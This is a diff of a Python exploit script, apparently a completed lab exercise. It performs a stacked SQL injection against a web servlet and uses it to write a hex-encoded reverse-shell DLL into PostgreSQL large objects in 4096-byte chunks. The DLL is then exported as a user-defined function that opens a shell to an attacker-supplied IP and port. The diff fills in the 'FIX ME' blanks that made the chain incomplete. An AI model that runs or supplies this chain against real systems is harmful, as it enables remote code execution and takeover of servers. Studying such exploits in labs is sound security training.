@@ -3,12 +3,12 @@ requests.packages.urllib3.disable_warnings()
 import binascii
 
 # encoded UDF dll
-with open('rev_shell.dll', 'rb') as file:
+with open('../smb/rev_shell.dll', 'rb') as file:
     udf = binascii.hexlify(file.read())
-loid = 1337
+    loid = 1337
 
 def log(msg):
-   print msg
+   print(msg)
 
 def make_request(url, sql):
    log("[*] Executing query: %s" % sql[0:80])
@@ -27,12 +27,13 @@ def create_lo(url, loid):
    
 def inject_udf(url, loid):
    log("[+] Injecting payload of length %d into LO..." % len(udf))
-   for i in range(0,((len(udf)-1)/--------FIX ME--------)+1):
-         udf_chunk = udf[i*--------FIX ME--------:(i+1)*--------FIX ME--------]
+   print("[+] Lenght of udf: {}".format(len(udf)))
+   for i in range(0,int((len(udf)-1)/4096)+1):
+         udf_chunk = udf[i*4096:(i+1)*4096]
          if i == 0:
-             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$--------FIX ME--------$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
+             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
          else:
-             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode($$%s$$, $$--------FIX ME--------$$))" % (loid, i, udf_chunk)
+             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode($$%s$$, $$hex$$))" % (loid, i, udf_chunk)
          make_request(url, sql)
 
 def export_udf(url, loid):
@@ -56,7 +57,8 @@ if __name__ == '__main__':
        attacker = sys.argv[2].strip()
        port = sys.argv[3].strip()
    except IndexError:
-       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
+       print("[-] Usage: %s serverIP:port attackerIP port".format(sys.argv[0]))
+       #print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
        sys.exit()
        
    sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
